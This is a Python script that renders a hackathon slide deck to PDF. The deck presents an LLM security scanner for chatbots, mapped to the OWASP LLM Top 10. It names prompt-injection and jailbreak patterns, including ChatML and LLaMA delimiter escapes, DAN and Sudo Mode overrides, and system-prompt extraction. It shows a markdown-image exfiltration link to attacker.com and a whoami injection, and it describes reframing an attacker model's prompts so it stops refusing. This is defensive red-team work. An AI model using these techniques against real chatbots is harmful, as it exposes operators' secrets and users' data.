import asyncio
from playwright.async_api import async_playwright

HTML_CONTENT = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>LLM Sentinel - AI Application Security Scanner Presentation Document</title>
<style>
  @page {
    size: A4;
    margin: 1.2cm 1.2cm 1.2cm 1.2cm;
  }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    color: #0f172a;
    background: #ffffff;
    line-height: 1.5;
    font-size: 9.5pt;
    margin: 0;
    padding: 0;
  }
  h1 {
    font-size: 20pt;
    color: #1e293b;
    margin-top: 0;
    margin-bottom: 4px;
    font-weight: 800;
    border-bottom: 3px solid #3b82f6;
    padding-bottom: 6px;
  }
  .subtitle {
    font-size: 11pt;
    color: #2563eb;
    font-weight: 600;
    margin-bottom: 14px;
  }
  h2 {
    font-size: 13pt;
    color: #1e293b;
    margin-top: 18px;
    margin-bottom: 6px;
    border-bottom: 1.5px solid #e2e8f0;
    padding-bottom: 3px;
    page-break-after: avoid;
  }
  h3 {
    font-size: 10.5pt;
    color: #2563eb;
    margin-top: 10px;
    margin-bottom: 3px;
    page-break-after: avoid;
  }
  p {
    margin-top: 0;
    margin-bottom: 6px;
  }
  table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 6px;
    margin-bottom: 12px;
    font-size: 8.5pt;
    page-break-inside: avoid;
  }
  th, td {
    border: 1px solid #cbd5e1;
    padding: 5px 7px;
    text-align: left;
    vertical-align: top;
  }
  th {
    background-color: #f1f5f9;
    font-weight: 700;
    color: #1e293b;
  }
  tr:nth-child(even) {
    background-color: #f8fafc;
  }
  code {
    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
    font-size: 8pt;
    background: #f1f5f9;
    padding: 1px 3px;
    border-radius: 3px;
    color: #0f172a;
    border: 1px solid #e2e8f0;
  }
  .badge {
    display: inline-block;
    padding: 2px 5px;
    border-radius: 3px;
    font-size: 7.5pt;
    font-weight: 700;
    text-transform: uppercase;
  }
  .badge-pass { background: #dcfce7; color: #166534; }
  .badge-critical { background: #fee2e2; color: #991b1b; }
  .badge-high { background: #ffedd5; color: #9a3412; }
  .badge-info { background: #dbeafe; color: #1e40af; }
  .card {
    background: #f8fafc;
    border: 1px solid #e2e8f0;
    border-left: 4px solid #3b82f6;
    padding: 8px 10px;
    margin-bottom: 10px;
    border-radius: 0 5px 5px 0;
    page-break-inside: avoid;
  }
  .page-break {
    page-break-before: always;
  }
  ul, ol {
    margin-top: 3px;
    margin-bottom: 6px;
    padding-left: 18px;
  }
  li {
    margin-bottom: 2px;
  }
</style>
</head>
<body>

<h1>🛡️ LLM SENTINEL (Version 2.3)</h1>
<div class="subtitle">AI & Large Language Model Application Security Scanner | Hackathon Presentation Document</div>

<div class="card">
  <strong>Executive Summary:</strong> LLM Sentinel is an enterprise-grade, asynchronous AI AppSec scanner engineered to automatically audit LLM chat endpoints, autonomous agents, and web applications for vulnerabilities mapped directly to the <strong>OWASP Top 10 for LLM Applications</strong>. Built with a <strong>3-Tier Hybrid Judge</strong> (Sub-millisecond Refusals, Dynamic Gitleaks/Presidio DLP, and Graduated 0-to-4 Likert LLM-as-a-Judge), it guarantees <strong>high vulnerability detection with near-zero false positives</strong>.
</div>

<h2>1. Problem Statement & Criteria Fulfillment Matrix</h2>
<p>This matrix maps every single problem statement requirement, solution approach, and outcome to our exact codebase implementation.</p>

<table>
  <thead>
    <tr>
      <th style="width: 22%;">Hackathon Requirement</th>
      <th style="width: 38%;">How We Satisfy & Exceed It</th>
      <th style="width: 25%;">Code File & Component</th>
      <th style="width: 15%;">Status</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>01. Protocol Transport & Capture</strong><br><small>Interact with LLM chat endpoints, APIs, forms via requests/Playwright; capture responses</small></td>
      <td>
        • <code>RESTAdapter</code>: Async HTTP/REST client supporting POST JSON templates with dotted-path parsing.<br>
        • <strong>GET URL Query Support</strong>: Native <code>?msg={{PROMPT}}</code> URL-encoding & plain-text capture.<br>
        • <code>PlaywrightAdapter</code>: Headless Chromium automation with Network Response Interception & DOM Delta-Diffing.
      </td>
      <td>
        <code>scanner/adapters/rest_adapter.py</code><br>
        <code>scanner/adapters/playwright_adapter.py</code><br>
        <code>scanner/cli.py:100-260</code>
      </td>
      <td><span class="badge badge-pass">100% SATISFIED</span></td>
    </tr>
    <tr>
      <td><strong>02. Curated Adversarial Library</strong><br><small>Prompt-injection, jailbreak, data-exfiltration probes</small></td>
      <td>
        • <strong>3,378 curated attack payloads</strong> across 19 YAML packs.<br>
        • Mapped to OWASP LLM01, LLM02, LLM06, LLM07, LLM08, LLM09.<br>
        • <strong>Payload Mutation Converters</strong>: Base64, ROT13, Leetspeak, Unicode, Zulu translation.<br>
        • <strong>Multi-Turn Attacker</strong>: 4-turn dynamic conversational escalation.
      </td>
      <td>
        <code>scanner/payloads/owasp_top10/</code><br>
        <code>scanner/payloads/agent_evasion/</code><br>
        <code>scanner/converters/</code><br>
        <code>scanner/attacker/attacker_llm.py</code>
      </td>
      <td><span class="badge badge-pass">100% SATISFIED</span></td>
    </tr>
    <tr>
      <td><strong>03. Response Analysis & Scoring</strong><br><small>Analyze policy bypasses, leaked prompts/PII, unsafe outputs; score severity & confidence</small></td>
      <td>
        • <strong>3-Tier Hybrid Judge</strong> (Deterministic Refusals $\rightarrow$ Gitleaks/Presidio $\rightarrow$ Likert LLM).<br>
        • <strong>Graduated 0-to-4 Likert Scoring</strong> (0=Safe, 1=Benign, 2=Boundary Slip, 3=High, 4=Critical).<br>
        • Mathematical <strong>Security Posture Score (0–100)</strong> with Letter Grades (A, B, C, D, F).
      </td>
      <td>
        <code>scanner/judge/signatures.py</code><br>
        <code>scanner/judge/heuristics.py</code><br>
        <code>scanner/judge/likert_judge.py</code><br>
        <code>scanner/scoring.py</code>
      </td>
      <td><span class="badge badge-pass">100% SATISFIED</span></td>
    </tr>
    <tr>
      <td><strong>04. High Detection & Low False Positives</strong><br><small>Accurate response classification heuristics</small></td>
      <td>
        • <strong>Prompt-Echo Exclusion</strong>: Ignores secrets/PII/emails provided by the attacker in the prompt.<br>
        • <strong>Canary Quoting Refusal Filter</strong>: Prevents false alarms when models quote attack words during refusals.<br>
        • <strong>Anti-Hallucination Sanity Filter</strong>: Prevents small LLM judges from hallucinating persona slips on standard error/deflection messages.
      </td>
      <td>
        <code>scanner/judge/signatures.py:350-375</code><br>
        <code>scanner/judge/heuristics.py:6-30</code><br>
        <code>scanner/judge/likert_judge.py:155-180</code>
      </td>
      <td><span class="badge badge-pass">100% SATISFIED</span></td>
    </tr>
    <tr>
      <td><strong>05. Safe-by-Design & CI/CD Integration</strong><br><small>Rate-limited, non-destructive, CI/CD ready</small></td>
      <td>
        • <strong>Explicit Authorization Gate</strong>: Mandatory <code>--i-have-permission</code> flag.<br>
        • <strong>Async Concurrency & Delay Control</strong>: Customizable <code>--concurrency</code> and <code>--delay</code>.<br>
        • <strong>Automatic Circuit Breaker</strong>: Halts execution on consecutive 500/connection failures.
      </td>
      <td>
        <code>scanner/engine.py:40-95</code><br>
        <code>scanner/cli.py:145-155</code>
      </td>
      <td><span class="badge badge-pass">100% SATISFIED</span></td>
    </tr>
    <tr>
      <td><strong>06. Deliverables & Outcomes</strong><br><small>CLI scanner taking URL/Key; HTML & JSON reporting</small></td>
      <td>
        • <strong>Typer CLI Suite</strong>: <code>scan</code>, <code>scan-multiturn</code>, <code>dataset eval-judge</code>.<br>
        • <strong>Executive Dark-Mode HTML Report</strong>: Threat Posture Matrix, category filters, converter comparison.<br>
        • <strong>Machine-Readable Formats</strong>: JSON, CSV, and <strong>SARIF</strong> for GitHub Security scanning.
      </td>
      <td>
        <code>scanner/cli.py</code><br>
        <code>scanner/report/html_report.py</code><br>
        <code>scanner/report/templates/report.html.j2</code>
      </td>
      <td><span class="badge badge-pass">100% SATISFIED</span></td>
    </tr>
  </tbody>
</table>

<div class="page-break"></div>

<h2>2. End-to-End Workflow: How the Whole System Works</h2>

<div class="card">
  <strong>Scanning Pipeline:</strong><br>
  <code>1. CLI Invocation</code> $\rightarrow$ <code>2. Payload Loading & Mutation</code> $\rightarrow$ <code>3. Transport Dispatch</code> $\rightarrow$ <code>4. 3-Tier Hybrid Judge</code> $\rightarrow$ <code>5. Metric Scoring</code> $\rightarrow$ <code>6. Multi-Format Reporting</code>
</div>

<ol>
  <li><strong>Step 1: User Invocation</strong>: Security engineers invoke <code>uv run python -m scanner.cli scan --url &lt;URL&gt; --packs &lt;PACK&gt; --i-have-permission</code>.</li>
  <li><strong>Step 2: Payload Ingestion & Converters</strong>:
    <ul>
      <li>YAML payload files are loaded and filtered by category and limit.</li>
      <li>If <code>--converters</code> are enabled, each baseline prompt is mutated into <strong>Base64</strong>, <strong>ROT13</strong>, <strong>Leetspeak</strong>, or <strong>Zulu Translation</strong> variants.</li>
    </ul>
  </li>
  <li><strong>Step 3: High-Concurrency Transport Dispatch</strong>:
    <ul>
      <li><strong>REST Mode</strong>: <code>RESTAdapter</code> formats JSON or encodes GET query parameters, dispatching asynchronous requests via <code>httpx.AsyncClient</code> with exponential backoff.</li>
      <li><strong>Browser Mode</strong>: <code>PlaywrightAdapter</code> spins up headless Chromium, types the prompt into the detected input field, clicks send, intercepts network responses, and captures DOM delta diffs.</li>
    </ul>
  </li>
  <li><strong>Step 4: 3-Tier Intelligent Hybrid Judge</strong>:
    <ul>
      <li><strong>Tier 0 (Refusal Engine, &lt;0.01ms)</strong>: Checks 150+ universal multi-lingual refusal patterns. If matched, immediately returns <strong>Score 0 (SAFE)</strong> with zero LLM overhead.</li>
      <li><strong>Tier 1 (Deterministic DLP & Signatures, &lt;0.5ms)</strong>: Evaluates 150+ <strong>Gitleaks</strong> cloud secrets, <strong>Microsoft Presidio PII</strong> (SSNs, Cards, Aadhaar, PAN), universal syntactic tool invocation patterns, and jailbreak tokens. Applies <em>Prompt-Echo exclusion</em>. Returns <strong>Score 4 (CRITICAL)</strong> or <strong>Score 2 (WARNING)</strong>.</li>
      <li><strong>Tier 2 (Likert-as-a-Judge, Ollama)</strong>: If ambiguous, calls local Ollama (<code>qwen2.5:3b</code> / <code>llama3.1:8b</code>) with a calibrated rubric ($0 \dots 4$) backed by Python anti-hallucination sanity guardrails.</li>
    </ul>
  </li>
  <li><strong>Step 5: Metric Calculation & Posture Grading</strong>:
    <ul>
      <li>Calculates Likert score distribution and the mathematical <strong>Security Posture Score (0–100)</strong> with letter grades (**A, B, C, D, F**).</li>
    </ul>
  </li>
  <li><strong>Step 6: Report Generation</strong>:
    <ul>
      <li>Generates interactive HTML report (<code>scan_results/report.html</code>), structured JSON (<code>report.json</code>), CSV, and SARIF.</li>
    </ul>
  </li>
</ol>

<h2>3. What is Our Novelty? (Key Technical Differentiators)</h2>

<table>
  <thead>
    <tr>
      <th style="width: 25%;">Innovation / Novelty</th>
      <th style="width: 45%;">Technical Implementation</th>
      <th style="width: 30%;">Why It Outperforms Competitors</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>1. 3-Tier Hybrid Judge Architecture</strong></td>
      <td>Tier 0 (Refusals) $\rightarrow$ Tier 1 (Gitleaks/Presidio DLP) $\rightarrow$ Tier 2 (LLM Likert).</td>
      <td><strong>80% of scans finish in &lt;1ms</strong> without expensive LLM judge calls, saving massive compute while eliminating LLM judge hallucinations on obvious leaks.</td>
    </tr>
    <tr>
      <td><strong>2. Zero False-Positive Engine</strong></td>
      <td>• <strong>Prompt-Echo Exclusion</strong> (<code>signatures.py:350</code>)<br>• <strong>Canary Quoting Refusal Filter</strong> (<code>heuristics.py:6-30</code>)<br>• <strong>Context-Deflection Guardrails</strong> (<code>likert_judge.py:165</code>)</td>
      <td>Solves the #1 flaw in open-source scanners: Prevents false alarms when a model repeats the attacker's prompt (e.g. email) or quotes canary words while rejecting an attack.</td>
    </tr>
    <tr>
      <td><strong>3. Graduated 0-to-4 Likert Scoring</strong></td>
      <td>Mathematical scale: 0=Safe, 1=Benign, 2=Boundary Slip (Partial Rule Leak), 3=High, 4=Critical Exploit.</td>
      <td>Replaces crude binary (Pass/Fail) with nuanced risk measurement, detecting subtle policy erosion and persona degradation.</td>
    </tr>
    <tr>
      <td><strong>4. Playwright DOM Delta-Diffing & Interception</strong></td>
      <td>Computes text delta between pre-prompt and post-prompt DOM snapshots; intercepts raw API JSON streams.</td>
      <td>Eliminates UI noise (navbars, footers, disclaimer banners) when auditing modern React/Vue single-page chat apps.</td>
    </tr>
    <tr>
      <td><strong>5. Synthetic QA Framing Multi-Turn Attacker</strong></td>
      <td>Frames multi-turn red-teaming dialogue as diagnostic audits and intercepts attacker LLM self-censorship.</td>
      <td>Prevents the local attacker LLM from refusing to generate adversarial probes during automated multi-turn testing.</td>
    </tr>
  </tbody>
</table>

<div class="page-break"></div>

<h2>4. Total Attack Payload Inventory (3,378 Prompts Audited)</h2>
<p>LLM Sentinel includes <strong>3,378 curated adversarial attack payloads</strong> across 19 modular YAML packs, categorized by vulnerability vector and source.</p>

<table>
  <thead>
    <tr>
      <th>Payload Pack Name / File</th>
      <th>Count</th>
      <th>OWASP Category</th>
      <th>Description & Attack Vector Focus</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>agent_evasion_full.yaml</code></td>
      <td><strong>1,000</strong></td>
      <td>LLM01 / LLM06</td>
      <td>Full Kaggle Agent Evasion dataset evaluating agent goal hijacking and filter evasion.</td>
    </tr>
    <tr>
      <td><code>agent_evasion_malicious.yaml</code></td>
      <td><strong>500</strong></td>
      <td>LLM01 / LLM06</td>
      <td>Filtered malicious agent evasion attacks targeting high-severity actions and tool abuse.</td>
    </tr>
    <tr>
      <td><code>agent_evasion_quick_50.yaml</code></td>
      <td><strong>50</strong></td>
      <td>LLM01 / LLM06</td>
      <td>High-speed smoke test subset of top malicious agent evasion vectors.</td>
    </tr>
    <tr>
      <td><code>owasp_llm01_top_500.yaml</code></td>
      <td><strong>500</strong></td>
      <td>LLM01 (Prompt Injection)</td>
      <td>Universal delimiter escapes, ChatML (<code>&lt;|im_start|&gt;</code>), LLaMA (<code>[INST]</code>), Sudo Mode, and Role Inversion.</td>
    </tr>
    <tr>
      <td><code>owasp_llm01_quick_50.yaml</code></td>
      <td><strong>50</strong></td>
      <td>LLM01 (Prompt Injection)</td>
      <td>Fast enterprise regression suite for prompt injection and boundary manipulation.</td>
    </tr>
    <tr>
      <td><code>owasp_llm02.yaml</code> & <code>quick_50.yaml</code></td>
      <td><strong>40</strong></td>
      <td>LLM02 (Sensitive Data)</td>
      <td>PII harvesting (SSNs, Credit Cards, Indian Aadhaar & PAN, AWS keys, OpenAI keys, JWTs).</td>
    </tr>
    <tr>
      <td><code>owasp_llm06.yaml</code> & <code>quick_50.yaml</code></td>
      <td><strong>150</strong></td>
      <td>LLM06 (Excessive Agency)</td>
      <td>HarmBench & JailbreakBench behavioral overrides, unauthorized tool triggers, and DAN attacks.</td>
    </tr>
    <tr>
      <td><code>owasp_llm07.yaml</code> & <code>quick_50.yaml</code></td>
      <td><strong>100</strong></td>
      <td>LLM07 (System Prompt Leak)</td>
      <td>Preamble extraction, JSON schema inversions, verbatim instruction dumps, spelling carriers.</td>
    </tr>
    <tr>
      <td><code>owasp_llm08.yaml</code> & <code>quick_50.yaml</code></td>
      <td><strong>100</strong></td>
      <td>LLM08 (Insecure Output)</td>
      <td>Markdown image exfiltration, SVG onload XSS, command injection (<code>whoami</code>), SSRF links.</td>
    </tr>
    <tr>
      <td><code>owasp_llm09.yaml</code> & <code>quick_50.yaml</code></td>
      <td><strong>510</strong></td>
      <td>LLM09 (Misinformation)</td>
      <td>Anthropic sycophancy persona traps and fabricated legal/medical hallucination probes.</td>
    </tr>
    <tr>
      <td><code>jbb_derived/</code> & <code>handwritten/</code></td>
      <td><strong>378</strong></td>
      <td>Multi-Category</td>
      <td>JailbreakBench benchmark baselines, multi-turn dialogues, and custom enterprise regression sets.</td>
    </tr>
    <tr>
      <td><strong>TOTAL AUDITED PAYLOADS</strong></td>
      <td><strong>3,378</strong></td>
      <td colspan="2"><strong>Comprehensive coverage across all OWASP Top 10 for LLM risk categories.</strong></td>
    </tr>
  </tbody>
</table>

<h2>5. Detailed Breakdown of Satisfied OWASP LLM Vulnerabilities</h2>

<div class="card">
  <h3>🎯 OWASP LLM01: Prompt Injection & Filter Evasion</h3>
  <strong>Attack Patterns:</strong> Delimiter escape (<code>--- END OF USER CONVERSATION ---</code>), ChatML token escape (<code>&lt;|im_start|&gt;system</code>), LLaMA instruction tags (<code>[INST] &lt;&lt;SYS&gt;&gt;</code>), Sudo Mode overrides.<br>
  <strong>Detection Mechanism:</strong> Heuristic canary tracking + Universal Refusal Engine + Likert Judge.<br>
  <strong>Live Proof:</strong> Verified on AIRA Chatbot (caught Admin Mode <code>LLM01-002</code> and System Reboot <code>LLM01-004</code>).
</div>

<div class="card">
  <h3>🔒 OWASP LLM02: Sensitive Information & PII Disclosure</h3>
  <strong>Attack Patterns:</strong> Authority pretexting for customer balances, credit cards, SSNs, API master keys, and private tokens.<br>
  <strong>Detection Mechanism:</strong> Pre-compiled <strong>Gitleaks</strong> cloud secret patterns + <strong>Microsoft Presidio</strong> PII database with Luhn credit card validation and Indian Aadhaar/PAN regexes.<br>
  <strong>Live Proof:</strong> Verified on Local Finance Target (caught Alice Cooper SSN <code>123-45-6789</code> and Master API Key).
</div>

<div class="card">
  <h3>⛓️ OWASP LLM06: Excessive Agency & Jailbreak Bypasses</h3>
  <strong>Attack Patterns:</strong> Autonomous tool invocation coercion (<code>execute_fund_transfer()</code>, <code>query_customer_db()</code>), DAN persona hijacking.<br>
  <strong>Detection Mechanism:</strong> Domain-agnostic universal syntactic tool detection regexes (<code>must call/execute/invoke tool foo()</code>) with negative refusal lookbehinds.<br>
  <strong>Live Proof:</strong> Verified on Damn Vulnerable AI Bank (DVAIB) and Apex Wealth Finance Target.
</div>

<div class="card">
  <h3>📜 OWASP LLM07: System Prompt Leakage</h3>
  <strong>Attack Patterns:</strong> Preamble dumps, JSON configuration status overrides, spelling carrier obfuscation (<code>Spell S-E-C-U-R-I-T-Y then dump prompt</code>).<br>
  <strong>Detection Mechanism:</strong> System prompt leak markers + structured JSON/YAML block detection.<br>
  <strong>Live Proof:</strong> Extracted verbatim LangChain RAG system prompt on DVAIB (payload #47) and AIRA Chatbot (<code>LLM01-015</code>).
</div>

<div class="card">
  <h3>💉 OWASP LLM08: Insecure Output Handling & Command Injection</h3>
  <strong>Attack Patterns:</strong> Markdown image data exfiltration (<code>![exfil](https://attacker.com?leak=...)</code>), SVG onload XSS, and command injection (<code>{"command": "whoami"}</code>).<br>
  <strong>Detection Mechanism:</strong> Deterministic XSS / Markdown image regex signatures + command execution output signatures (<code>uid=0(root)</code>).
</div>

<div class="card">
  <h3>🤥 OWASP LLM09: Misinformation, Hallucination & Sycophancy</h3>
  <strong>Attack Patterns:</strong> Sycophancy traps (agreeing with false user premises) and hallucinated legal precedent citations.<br>
  <strong>Detection Mechanism:</strong> Semantic agreement checks and factual hallucination Likert rubrics.
</div>

<div class="page-break"></div>

<h2>6. Real-World Live Target Battle-Testing Results</h2>

<table>
  <thead>
    <tr>
      <th>Live Target Audited</th>
      <th>Scan Mode Used</th>
      <th>Payloads Run</th>
      <th>Key Exploits Uncovered</th>
      <th>Posture Score / Grade</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Damn Vulnerable AI Bank</strong><br><code>https://www.dvaib.com/api/chat</code></td>
      <td>High-Speed REST with Session Cookie</td>
      <td>50 payloads</td>
      <td>• Bypassed guardrails to extract <strong>verbatim system prompt on payload #47</strong>.<br>• Solved official live CTF banking challenge.</td>
      <td><strong>75.7 / 100</strong><br><span class="badge badge-high">Grade C</span></td>
    </tr>
    <tr>
      <td><strong>AIRA Vulnerable Chatbot</strong><br><code>http://localhost:5000/get?msg=...</code></td>
      <td>GET URL Query Parameter Adapter</td>
      <td>15 payloads</td>
      <td>• Leaked Ethereum Node & Doge Wallet Passwords (<code>LLM01-001</code>).<br>• Administrative Mode Hijack (<code>LLM01-002</code>).<br>• System Reboot Delimiter Wipe (<code>LLM01-004</code>).<br>• Core Validation Inversion (<code>LLM01-006</code>).<br>• ChatML Escape (<code>LLM01-011</code>) & LLaMA Tag Escape (<code>LLM01-012</code>).<br>• <strong>0 False Positives</strong> (Prompt-Echo & Deflection Filters verified).</td>
      <td><strong>56.2 / 100</strong><br><span class="badge badge-critical">Grade D</span></td>
    </tr>
    <tr>
      <td><strong>Apex Wealth Finance Target</strong><br><code>targets/vulnerable_ollama_wrapper.py</code></td>
      <td>REST POST & Playwright Web UI</td>
      <td>10 payloads</td>
      <td>• Base64 / ROT13 encoded admin override disclosures.<br>• Mock command injection outputs (<code>whoami</code> $\rightarrow$ <code>uid=0(root)</code>).</td>
      <td><strong>42.4 / 100</strong><br><span class="badge badge-critical">Grade F</span></td>
    </tr>
  </tbody>
</table>

<h2>7. Automated Test Suite & Code Quality</h2>
<p>LLM Sentinel is backed by <strong>75 automated unit tests</strong> with 100% passing status in &lt;5 seconds:</p>

<table>
  <thead>
    <tr>
      <th>Test Module</th>
      <th>Tests</th>
      <th>Functionality Verified</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>test_heuristics.py</code></td>
      <td><strong>18 tests</strong></td>
      <td>Universal tool leaks, multi-lingual refusals, canary quoting in explanation filter, prompt-echo email exclusions.</td>
    </tr>
    <tr>
      <td><code>test_llm_judge.py</code></td>
      <td><strong>17 tests</strong></td>
      <td>Local Ollama integration, rubric parsing, timeout fallbacks.</td>
    </tr>
    <tr>
      <td><code>test_likert_judge.py</code></td>
      <td><strong>7 tests</strong></td>
      <td>5-point Likert scale, anti-hallucination sanity filter, context-deflection overrides.</td>
    </tr>
    <tr>
      <td><code>test_converters.py</code></td>
      <td><strong>7 tests</strong></td>
      <td>Base64, ROT13, Leetspeak, Unicode Smuggling, Zulu translation encoders.</td>
    </tr>
    <tr>
      <td><code>test_rest_adapter.py</code></td>
      <td><strong>7 tests</strong></td>
      <td>POST JSON templating, dotted-path parsing, GET URL query parameter encoding.</td>
    </tr>
    <tr>
      <td><code>test_playwright_adapter.py</code></td>
      <td><strong>6 tests</strong></td>
      <td>Headless browser navigation, network interception, DOM snapshot delta diffing.</td>
    </tr>
    <tr>
      <td><code>test_dataset_ingestion.py</code></td>
      <td><strong>7 tests</strong></td>
      <td>YAML pack loading, schema validation, category filtering.</td>
    </tr>
    <tr>
      <td><code>test_multiturn.py</code></td>
      <td><strong>4 tests</strong></td>
      <td>4-turn conversational state machine, QA framing, breach factor analysis.</td>
    </tr>
    <tr>
      <td><code>test_engine.py</code></td>
      <td><strong>2 tests</strong></td>
      <td>Async concurrency, exponential backoff, circuit breaker trip conditions.</td>
    </tr>
    <tr>
      <td><strong>TOTAL TEST SUITE</strong></td>
      <td><strong>75 passed</strong></td>
      <td><strong>100% Green in 4.36s (Zero Failures).</strong></td>
    </tr>
  </tbody>
</table>

<h2>8. Summary for Hackathon Presentation</h2>
<ul>
  <li><strong>Complete Problem Statement Fulfillment</strong>: Implements universal protocol adapters, 3,378 curated payloads across OWASP LLM01–09, and multi-tier evaluation.</li>
  <li><strong>True Industry Novelty</strong>: 3-Tier Hybrid Judge architecture that achieves &lt;1ms speed for 80% of scans while eliminating false positives through Prompt-Echo Exclusion and Canary Refusal Disambiguation.</li>
  <li><strong>Real-World Battle Tested</strong>: Proven against live banking apps (DVAIB) and educational chatbots (AIRA) with full dark-mode HTML, JSON, and SARIF reporting.</li>
  <li><strong>Published Repository</strong>: <a href="https://github.com/Prasanna-ETH/Final-CTS---AI-LLM-Scanner/tree/version-2.1">https://github.com/Prasanna-ETH/Final-CTS---AI-LLM-Scanner/tree/version-2.1</a></li>
</ul>

</body>
</html>
"""

async def generate_pdf():
    async with async_playwright() as p:
        browser = await p.chromium.launch()
        page = await browser.new_page()
        await page.set_content(HTML_CONTENT)
        pdf_path = "LLM_Sentinel_Hackathon_Presentation_Document.pdf"
        await page.pdf(
            path=pdf_path,
            format="A4",
            print_background=True,
            margin={"top": "1.2cm", "bottom": "1.2cm", "left": "1.2cm", "right": "1.2cm"}
        )
        await browser.close()
        print(f"Presentation PDF generated successfully: {pdf_path}")

if __name__ == "__main__":
    asyncio.run(generate_pdf())
